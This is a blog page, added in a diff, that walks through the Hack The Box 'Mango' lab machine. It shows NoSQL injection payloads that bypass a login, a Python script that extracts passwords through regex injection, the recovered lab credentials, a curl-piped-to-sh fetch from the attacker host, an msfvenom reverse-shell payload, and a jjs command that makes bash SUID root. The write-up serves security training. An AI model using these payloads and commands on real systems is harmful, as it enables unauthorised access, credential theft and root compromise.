@@ -1,0 +1,674 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Mango - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Mango - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-mango/">
+
+
+  <meta property="og:description" content="Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-mango/mango_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-04-17T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-mango/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Mango - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Mango - Hack The Box">
+    <meta itemprop="description" content="Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root.">
+    <meta itemprop="datePublished" content="April 17, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Mango - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-04-17T00:00:00+02:00">April 17, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-mango/mango_logo.png" alt="" /></p>
+
+<p>Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>There’s an authentication page using MangoDB that is vulnerable to NoSQL injection</li>
+  <li>We can extract the username and passwords for two accounts: <code class="language-plaintext highlighter-rouge">mango</code> and <code class="language-plaintext highlighter-rouge">admin</code></li>
+  <li>Using the recovered password, we can SSH as <code class="language-plaintext highlighter-rouge">mango</code> then su to <code class="language-plaintext highlighter-rouge">admin</code></li>
+  <li>The jjs java utility is installed and is SUID root so we can execute anything as root</li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb# nmap -T4 -p- 10.10.10.162
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 21:47 EDT
+Nmap scan report for mango.htb (10.10.10.162)
+Host is up (0.040s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre></div></div>
+
+<h2 id="recon---http">Recon - HTTP</h2>
+
+<p>Using the IP address I get a Forbidden error message when I try to access the site on port 80.</p>
+
+<p><img src="/assets/images/htb-writeup-mango/web1.png" alt="" /></p>
+
+<p>I tried using <code class="language-plaintext highlighter-rouge">mango.htb</code> but I get the same error message.</p>
+
+<p>Nothing shows up when fuzzing files and directories:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php -u http://mango.htb --no-banner -S 400,401,403,404
+~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~
+
+[?] Started at	: 2019-10-27 20:47:41
+
+  [00:02:45] ########################################   40908/40908   ETA: 00:00:00 req/s: 24
+</code></pre></div></div>
+
+<h2 id="recon---https">Recon - HTTPS</h2>
+
+<p>The page on port 443 is different: It looks like a Google page but anytime I try to search for something I get <code class="language-plaintext highlighter-rouge">Search Results: 0 results found</code></p>
+
+<p><img src="/assets/images/htb-writeup-mango/web2.png" alt="" /></p>
+
+<p>There’s an analytics page that shows some kind of javascript application and there’s an error message about an invalid license.</p>
+
+<p><img src="/assets/images/htb-writeup-mango/web3.png" alt="" /></p>
+
+<p>As far as I can see this is a local application and nothing I do gets sent to the server. It’s probably safe to skip that one for now.</p>
+
+<p>Nothing else shows up when fuzzing files and directories:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php -k -u https://mango.htb --no-banner -S 400,401,403,404
+~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~
+
+[?] Started at	: 2019-10-27 20:47:52
+
+GET     200 OK                          https://mango.htb/analytics.php
+GET     200 OK                          https://mango.htb/index.php
+  [00:02:42] ########################################   40908/40908   ETA: 00:00:00 req/s: 252
+</code></pre></div></div>
+
+<h2 id="fuzzing-vhosts-to-find-the-staging-site">Fuzzing vhosts to find the staging site</h2>
+
+<p>I found the <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> site by fuzzing the vhosts.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ffuf -w ~/tools/SecLists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.mango.htb" -fc 400,403 -u http://10.10.10.162
+
+[...]
+
+staging-order           [Status: 200, Size: 4022, Words: 447, Lines: 210]
+</code></pre></div></div>
+
+<p>There’s a login page with a non-functional Forgot Password button.</p>
+
+<p><img src="/assets/images/htb-writeup-mango/web4.png" alt="" /></p>
+
+<h2 id="nosql-injection-on-the-login-page">NoSQL injection on the login page</h2>
+
+<p>I ran SQLmap and looked for SQL injections on the login page but couldn’t find any. I also tried a bunch of simple user/passwords combos in case it’s something really simple. Before going to bruteforce I thought I’d try some MangoDB injection since the name of the box looks like a hint.</p>
+
+<p>I’ll use the NoSQL injection page from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadsAllTheThings</a> as a reference to try a few payloads.</p>
+
+<p>With <code class="language-plaintext highlighter-rouge">username[$ne]=bob&amp;password[$ne]=invalid&amp;login=login</code> I can set a negative comparison on the username and password and I notice that I get a 302 HTTP return code instead of a 200 like when I try invalid credentials. I’ve successfully bypassed the authentication page but the <code class="language-plaintext highlighter-rouge">home.php</code> I get redirected to doesn’t have anything on it.</p>
+
+<p><img src="/assets/images/htb-writeup-mango/web5.png" alt="" /></p>
+
+<p>I’ll go back to the NoSQL injection and try to extract the usernames and passwords from the database. First, I’ll find the username by using the <code class="language-plaintext highlighter-rouge">[$regex]</code> operator so I can provide a regex inside of the username parameter.</p>
+
+<p>I already guessed that <code class="language-plaintext highlighter-rouge">admin</code> is a valid username so I don’t even need the regex for that one. The following evaluates to TRUE (returns a 302):</p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^admin$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p>Next, I’ll try each letter of the alphabet like this:</p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^b.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p>I find a username starting with letter m with:</p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^m.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p>So now I just need to guess each letter like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^m.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^ma.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^man.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^mang.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">username[$regex]=^mango.*$&amp;password[$ne]=invalid&amp;login=login</code></p>
+
+<p>So I have <code class="language-plaintext highlighter-rouge">mango</code> and <code class="language-plaintext highlighter-rouge">admin</code> as valid usernames. Now it’s time to tackle the passwords for each account. I can find the password length by using something like this:</p>
+
+<p>Admin (12 characters): <code class="language-plaintext highlighter-rouge">username=admin&amp;password[$regex]=^.{12}$&amp;login=login</code>
+Mango (16 characters): <code class="language-plaintext highlighter-rouge">username=mango&amp;password[$regex]=^.{16}$&amp;login=login</code></p>
+
+<p>For the password, I can just the same technique manually or write a simple script like the following to automate the process:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Charset </span><span class="si">{</span><span class="n">chars</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://staging-order.mango.htb/"</span>
+<span class="n">p</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+            <span class="s">"password[$regex]"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"^</span><span class="si">{</span><span class="n">re</span><span class="p">.</span><span class="n">escape</span><span class="p">(</span><span class="n">p</span><span class="o">+</span><span class="n">x</span><span class="p">)</span><span class="si">}</span><span class="s">.*$"</span><span class="p">,</span>
+            <span class="s">"login"</span><span class="p">:</span> <span class="s">"login"</span>
+        <span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"127.0.0.1:8080"</span><span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+            <span class="n">p</span> <span class="o">+=</span> <span class="n">x</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/mango# ./mango.py 
+Charset abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
+
+t
+t9
+t9K
+t9Kc
+t9KcS
+t9KcS3
+t9KcS3&gt;
+t9KcS3&gt;!
+t9KcS3&gt;!0
+t9KcS3&gt;!0B
+t9KcS3&gt;!0B#
+t9KcS3&gt;!0B#2
+t9KcS3&gt;!0B#2
+</code></pre></div></div>
+
+<p>I just replace <code class="language-plaintext highlighter-rouge">admin</code> by <code class="language-plaintext highlighter-rouge">mango</code> and run it again. I got the following passwords now:</p>
+
+<p>admin: <code class="language-plaintext highlighter-rouge">t9KcS3&gt;!0B#2</code>
+mango: <code class="language-plaintext highlighter-rouge">h3mXK8RhU~f{]f5H</code></p>
+
+<h2 id="getting-a-shell-as-user-admin">Getting a shell as user admin</h2>
+
+<p>I can SSH to the machine and su to <code class="language-plaintext highlighter-rouge">admin</code> since I also have the password for that user:</p>
+
+<p><img src="/assets/images/htb-writeup-mango/shell1.png" alt="" /></p>
+
+<h2 id="privesc-using-jjs">Privesc using jjs</h2>
+
+<p>With <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> I see there’s a SUID file for <code class="language-plaintext highlighter-rouge">jjs</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@mango:/home/admin$ curl 10.10.14.11/LinEnum.sh | sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 46108  100 46108    0     0   229k      0 --:--:-- --:--:-- --:--:--  228k
+-e 
+#########################################################
+-e # Local Linux Enumeration &amp; Privilege Escalation Script #
+-e #########################################################
+-e # www.rebootuser.com
+-e # version 0.98
+[...]
+-e [+] Possibly interesting SUID files:
+-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+-e 
+</code></pre></div></div>
+
+<p>A quick search on <a href="https://gtfobins.github.io/gtfobins/jjs/">GTFObins</a> shows that we can execute commands with <code class="language-plaintext highlighter-rouge">jjs</code>.</p>
+
+<p>I can quickly get the root flag with:</p>
+
+<p><img src="/assets/images/htb-writeup-mango/root1.png" alt="" /></p>
+
+<p>Or get a proper shell by generating a meterpreter shell with the <code class="language-plaintext highlighter-rouge">PrependSetuid</code> option:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/mango# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.11 LPORT=4444 PrependSetuid=true
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 146 bytes
+Final size of elf file: 266 bytes
+Saved as: met
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-mango/root2.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-mango/root3.png" alt="" /></p>
+
+<p>Or, a faster way to get a root shell is to make bash SUID:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@mango:/home/admin$ jjs
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs&gt; Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
+0
+jjs&gt; 
+admin@mango:/home/admin$ /bin/bash -p
+bash-4.4# id
+uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#jjs" class="page__taxonomy-item" rel="tag">jjs</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#mango" class="page__taxonomy-item" rel="tag">mango</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#nosql" class="page__taxonomy-item" rel="tag">nosql</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-04-17T00:00:00+02:00">April 17, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-traverxec/" class="pagination--pager" title="Traverxec - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-control/" class="pagination--pager" title="Control - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
